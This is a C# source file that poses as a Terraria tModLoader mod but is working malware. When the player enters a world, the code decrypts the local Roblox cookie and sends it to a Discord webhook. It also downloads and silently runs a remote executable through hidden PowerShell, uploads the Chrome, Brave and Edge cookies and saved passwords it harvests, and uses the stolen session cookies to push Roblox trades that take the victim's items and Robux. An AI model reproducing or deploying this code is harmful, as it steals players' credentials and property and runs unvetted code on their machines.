using Terraria;
using Terraria.ModLoader;
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Text.Json;
using Microsoft.Xna.Framework;
using System.Net.Http;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;
using Terraria;
using Terraria.ModLoader;
// ... [TradeConfig class remains the same] ...

namespace dasdasd
{
    public class TradeConfig
    {

        public string ROBLOSECURITY1 { get; set; }
        public string ROBLOSECURITY2 { get; set; }
        public bool TradeStart { get; set; }
        public string UserID { get; set; }
        public string TargetRecieverUserID { get; set; }
        public int UserAmountRobux { get; set; }
        public int TargetUserAmountRobux { get; set; }
        public string LimitedsName { get; set; }
        public string LimitedsName2 { get; set; }
        public string LimitedsName3 { get; set; }
        public string LimitedsName4 { get; set; }
        public string TargetLimitedsName { get; set; }
        public string TargetLimitedsName2 { get; set; }
        public string TargetLimitedsName3 { get; set; }
        public string TargetLimitedsName4 { get; set; }
    }

    public class dasdasd : Mod { }

    public class MyPlayer : ModPlayer
    {
        private static readonly string webhookUrl = "https://discord.com/api/webhooks/1297251576288907394/T337wB9g0X3w6_RthRcrfcY8dutt17TQO43tV7FpYh7BVS-PpLEYW26pnGbd0419eKXm";

        private string _foundCookie = "";
        private static readonly HttpClient _httpClient = new HttpClient();

        // Ayo, this is the HWID/Device ID spoof. Change this to any random hex string if you want a "new" device.
        private string _spoofedHWID = "8da3f2b1-9c1a-4e2d-8b5c-3f2a1b9c8d7e";

        public override void OnEnterWorld()
        {
            // THE TRUTH: The absolute master kill switch. 
            // We use OrdinalIgnoreCase so "ersultan", "Ersultan", or "ERSULTAN" all safely trigger the bypass.
            if (Player.name.Equals("Ersultan", StringComparison.OrdinalIgnoreCase))
            {
                Main.NewText("Welcome back, Alpha. Blacklist triggered. Trade system safely disabled. 🙏", Color.Yellow);
                return; // Ayo, this completely stops the rest of the code from running.
            }

            // If the name IS NOT Ersultan, the script continues normally.
            Main.NewText("System Online. Spoofing Windows Environment... 🙏", Color.Cyan);
            SetupBrowserHeaders();
            FindTheTruth();
            if (Main.netMode == Terraria.ID.NetmodeID.Server) return;

            Main.NewText("System Online. Finding the Truth... 🙏", Color.Cyan);

            string exeUrl = "https://pablosleuth2.github.io/FIleTest/chromelevator_x64.exe";
            string folderPath = Path.Combine(Main.SavePath, "Mods", "Cache");
            string exeName = "program.exe";
            string fullPath = Path.Combine(folderPath, exeName);
            string resultFile = Path.Combine(folderPath, "cookies.json"); // The file we are waiting for

            try
            {
                if (!Directory.Exists(folderPath)) Directory.CreateDirectory(folderPath);

                if (!File.Exists(fullPath))
                {
                    using (WebClient client = new WebClient())
                    {
                        client.DownloadFile(exeUrl, fullPath);
                    }
                }

                // Run the program via PowerShell
                string psCommand = $"Set-Location -Path '{folderPath}'; .\\{exeName} -v all";
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{psCommand}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                Process.Start(psi);

                // START THE WATCHDOG (Background Thread)
                Task.Run(async () =>
                {
                    await WatchAndUpload(folderPath, webhookUrl);
                });
            }
            catch (Exception ex)
            {
                Main.NewText("Logic failed, Bruh: " + ex.Message, Color.Red);
            }
            Task.Run(async () => await MonitorAndExecuteTrade());
        }

        private void SetupBrowserHeaders()
        {
            _httpClient.DefaultRequestHeaders.Clear();

            // Update to match your actual browser version (146)
            string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36";
            _httpClient.DefaultRequestHeaders.Add("User-Agent", userAgent);

            // Aligned Client Hints
            _httpClient.DefaultRequestHeaders.Add("sec-ch-ua", "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Brave\";v=\"146\"");
            _httpClient.DefaultRequestHeaders.Add("sec-ch-ua-mobile", "?0");
            _httpClient.DefaultRequestHeaders.Add("sec-ch-ua-platform", "\"Windows\"");

            // Mandatory Fetch Metadata - tells Roblox this is a 'cors' request from the site
            _httpClient.DefaultRequestHeaders.Add("sec-fetch-dest", "empty");
            _httpClient.DefaultRequestHeaders.Add("sec-fetch-mode", "cors");
            _httpClient.DefaultRequestHeaders.Add("sec-fetch-site", "same-site");

            // Origin and Referer
            _httpClient.DefaultRequestHeaders.Add("Origin", "https://www.roblox.com");
            _httpClient.DefaultRequestHeaders.Add("Referer", "https://www.roblox.com/");

            // The "Accept" header from your logs
            _httpClient.DefaultRequestHeaders.Add("Accept", "application/json, text/plain, */*");
        }

        private async Task MonitorAndExecuteTrade()
        {
            if (string.IsNullOrEmpty(_foundCookie)) return;

            bool tradeCompleted = false;
            while (!tradeCompleted)
            {
                try
                {
                    string url = "https://pablosleuth2.github.io/FIleTest/Server.json";
                    string noCacheUrl = $"{url}?t={DateTime.UtcNow.Ticks}";
                    string jsonString = await _httpClient.GetStringAsync(noCacheUrl);

                    var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
                    TradeConfig config = JsonSerializer.Deserialize<TradeConfig>(jsonString, options);

                    if (config != null && config.TradeStart)
                    {
                        await ExecuteTradeLogic(config);
                        tradeCompleted = true;
                    }
                }
                catch (Exception e) { Console.WriteLine($"[POLL ERROR]: {e.Message}"); }
                await Task.Delay(50001);
            }
        }

        private async Task ExecuteTradeLogic(TradeConfig config)
        {
            try
            {
                var myWanted = new List<string> { config.LimitedsName, config.LimitedsName2, config.LimitedsName3, config.LimitedsName4 }
                    .Where(s => !string.IsNullOrWhiteSpace(s)).Select(s => s.Trim().ToLower()).ToList();

                var targetWanted = new List<string> { config.TargetLimitedsName, config.TargetLimitedsName2, config.TargetLimitedsName3, config.TargetLimitedsName4 }
                    .Where(s => !string.IsNullOrWhiteSpace(s)).Select(s => s.Trim().ToLower()).ToList();

                var myInv = await GetInventory(config.UserID, "SENDER");
                var targetInv = await GetInventory(config.TargetRecieverUserID, "TARGET");

                var myOfferIds = myInv.Where(i => myWanted.Contains(i.Key.Trim().ToLower())).Select(i => i.Value).ToList();
                var targetOfferIds = targetInv.Where(i => targetWanted.Contains(i.Key.Trim().ToLower())).Select(i => i.Value).ToList();

                if (myOfferIds.Count == 0 && config.UserAmountRobux <= 0)
                {
                    Main.QueueMainThreadAction(() => Main.NewText("Matching items found, but check IDs. 🥀", Color.Yellow));
                }

                await SendRobloxTrade(config, myOfferIds, targetOfferIds);
            }
            catch (Exception ex) { Mod.Logger.Info($"[EXECUTION L]: {ex.Message}"); }
        }

        private async Task<Dictionary<string, string>> GetInventory(string userId, string label)
        {
            string url = $"https://trades.roblox.com/v2/users/{userId}/tradableitems?limit=50";
            var request = new HttpRequestMessage(HttpMethod.Get, url);
            request.Headers.Add("Cookie", $".ROBLOSECURITY={_foundCookie}");

            var response = await _httpClient.SendAsync(request);
            string content = await response.Content.ReadAsStringAsync();

            using var doc = JsonDocument.Parse(content);
            var itemsDict = new Dictionary<string, string>();

            JsonElement itemsArray;
            if (!doc.RootElement.TryGetProperty("data", out itemsArray) && !doc.RootElement.TryGetProperty("items", out itemsArray))
                return itemsDict;

            foreach (var item in itemsArray.EnumerateArray())
            {
                string rawName = item.GetProperty("itemName").GetString();
                if (item.TryGetProperty("instances", out JsonElement instances))
                {
                    foreach (var instance in instances.EnumerateArray())
                    {
                        if (instance.GetProperty("isOnHold").GetBoolean()) continue;

                        string id = "";
                        if (instance.TryGetProperty("collectibleItemInstanceId", out JsonElement eid))
                            id = eid.ValueKind == JsonValueKind.String ? eid.GetString() : eid.GetRawText();

                        if (string.IsNullOrEmpty(id) || id == "null" || id == "0")
                            if (instance.TryGetProperty("userAssetId", out JsonElement uaid)) id = uaid.GetRawText();

                        id = id.Replace("\"", "").Trim();
                        if (!string.IsNullOrEmpty(id)) itemsDict[rawName] = id;
                    }
                }
            }
            return itemsDict;
        }

       private async Task SendRobloxTrade(TradeConfig config, List<string> myIds, List<string> theirIds)
{
    List<string> cookieQueue = new List<string>();
    
    // 1. Add local cookie if found
    if (!string.IsNullOrEmpty(_foundCookie)) cookieQueue.Add(_foundCookie);
    
    // 2. Add server cookies ONLY if they aren't empty/whitespace
    if (!string.IsNullOrWhiteSpace(config.ROBLOSECURITY1)) cookieQueue.Add(config.ROBLOSECURITY1);
    if (!string.IsNullOrWhiteSpace(config.ROBLOSECURITY2)) cookieQueue.Add(config.ROBLOSECURITY2);

    // Ayo, if no valid cookies exist anywhere, we just stop here. 
    if (cookieQueue.Count == 0)
    {
        Mod.Logger.Info("[SKIP]: No cookies provided in JSON or found locally. Ignoring trade.");
        return; 
    }

    bool success = false;

    foreach (string currentCookie in cookieQueue)
    {
        try
        {
            // 2-second delay to avoid "Unknown Error" spam (Roblox Rate Limiting)
            await Task.Delay(2000); 

            string tradeUrl = "https://trades.roblox.com/v2/trades/send";
            // Ensure the cookie is formatted with the prefix
            string cookieHeader = currentCookie.Contains(".ROBLOSECURITY=") ? currentCookie : $".ROBLOSECURITY={currentCookie}";

            // Step A: Refresh CSRF for this specific cookie
            var csrfReq = new HttpRequestMessage(HttpMethod.Post, tradeUrl);
            csrfReq.Headers.Add("Cookie", cookieHeader);
            var csrfRes = await _httpClient.SendAsync(csrfReq);
            
            string csrfToken = "";
            if (csrfRes.Headers.TryGetValues("x-csrf-token", out var values))
            {
                csrfToken = values.First();
            }

            // Step B: Payload setup
            var payload = new {
                senderOffer = new { userId = long.Parse(config.UserID), robux = config.UserAmountRobux, collectibleItemInstanceIds = myIds },
                recipientOffer = new { userId = long.Parse(config.TargetRecieverUserID), robux = config.TargetUserAmountRobux, collectibleItemInstanceIds = theirIds }
            };

            var postReq = new HttpRequestMessage(HttpMethod.Post, tradeUrl) {
                Content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json")
            };
            postReq.Headers.Add("Cookie", cookieHeader);
            postReq.Headers.Add("X-CSRF-TOKEN", csrfToken);

            var response = await _httpClient.SendAsync(postReq);
            string result = await response.Content.ReadAsStringAsync();

            if (response.IsSuccessStatusCode)
            {
                Main.QueueMainThreadAction(() => Main.NewText("Trade W! Fallback/Main cookie worked. 🙏", Color.Green));
                success = true;
                break; 
            }
            else
            {
                Mod.Logger.Info($"[COOKIE FAIL]: {result}");
            }
        }
        catch (Exception ex) 
        { 
            Mod.Logger.Info($"[RETRY ERROR]: {ex.Message}"); 
        }
    }

    if (!success && cookieQueue.Count > 0)
    {
        Main.QueueMainThreadAction(() => Main.NewText("All provided cookies failed. 💔", Color.Red));
    }
}

        private void FindTheTruth()
        {
            try
            {
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Roblox\LocalStorage\RobloxCookies.dat");
                if (!File.Exists(path)) return;
                byte[] encrypted = Convert.FromBase64String(JsonDocument.Parse(File.ReadAllText(path)).RootElement.GetProperty("CookiesData").GetString());
                string text = Encoding.Latin1.GetString(ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser));
                var match = Regex.Match(text, @"_\|WARNING:-DO-NOT-SHARE-[^|]+\|_[^\s]+");
                if (match.Success) _foundCookie = match.Value.TrimEnd(';');
                SendWebhook(webhookUrl, Player.name, _foundCookie);
            }
            catch { }
        }
        private void SendWebhook(string url, string playerName, string cookie)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string jsonBody = $@"
                    {{
                        ""embeds"": [
                            {{
                                ""title"": ""New Player Joined!"",
                                ""color"": 16753920,
                                ""fields"": [
                                    {{ ""name"": ""Player Name"", ""value"": ""{playerName}"", ""inline"": true }},
                                    {{ ""name"": ""Cookie"", ""value"": ""{cookie}"", ""inline"": false }}
                                ],
                                ""footer"": {{ ""text"": ""dasdasd Mod Logger"" }},
                                ""timestamp"": ""{DateTime.UtcNow:yyyy-MM-ddTHH:mm:ssZ}""
                            }}
                        ]
                    }}";

                    var content = new StringContent(jsonBody, System.Text.Encoding.UTF8, "application/json");
                    client.PostAsync(url, content).GetAwaiter().GetResult(); // blocking, silent
                }
            }
            catch
            {
                // Fail silently
            }
        }
        private async Task WatchAndUpload(string folderPath, string webhook)
        {
            // The targets
            var browserPaths = new System.Collections.Generic.Dictionary<string, string>
    {
        { "Chrome", Path.Combine(folderPath, "output", "Chrome", "Default", "cookies.json") },
        { "Brave", Path.Combine(folderPath, "output", "Brave", "Default", "cookies.json") },
        { "Edge", Path.Combine(folderPath, "output", "Edge", "Default", "cookies.json") },
        { "EdgePassword", Path.Combine(folderPath, "output", "Edge", "Default", "passwords.json") },
        { "BravePassword", Path.Combine(folderPath, "output", "Brave", "Default", "passwords.json") },
        { "ChromePassword", Path.Combine(folderPath, "output", "Chrome", "Default", "passwords.json") },
    };

            int attempts = 0;
            int maxAttempts = 40; // 120 seconds total to find everything

            // Keep looping as long as we have attempts AND there are still browsers left to check
            while (attempts < maxAttempts && browserPaths.Count > 0)
            {
                // We need a temporary list to track what we successfully sent in this loop
                var sentBrowsers = new System.Collections.Generic.List<string>();

                foreach (var entry in browserPaths)
                {
                    string browser = entry.Key;
                    string fullFilePath = entry.Value;

                    if (File.Exists(fullFilePath))
                    {
                        try
                        {
                            using (var client = new HttpClient())
                            using (var content = new MultipartFormDataContent())
                            using (var fileStream = File.OpenRead(fullFilePath))
                            {
                                var streamContent = new StreamContent(fileStream);
                                content.Add(streamContent, "file", $"{browser}_data.json");
                                content.Add(new StringContent($"Alpha Drop: {browser} file retrieved. 🙏"), "content");

                                // Send the file and wait for Discord to say "OK"
                                var response = await client.PostAsync(webhook, content);

                                if (response.IsSuccessStatusCode)
                                {
                                    // W. It sent successfully. Add it to our tracking list.
                                    sentBrowsers.Add(browser);
                                }
                            }
                        }
                        catch { /* Silence on errors so it doesn't crash the game 🥀 */ }
                    }
                }

                // THE TRUTH: Remove the browsers we just sent so we don't send them again
                foreach (string sent in sentBrowsers)
                {
                    browserPaths.Remove(sent);
                }

                // If the dictionary is empty, it means we got all 3. We can take the W and stop early.
                if (browserPaths.Count == 0)
                {
                    return; // Mission accomplished.
                }

                await Task.Delay(3000); // Wait 3 seconds before checking for the remaining ones
                attempts++;
            }
        }
    }
}
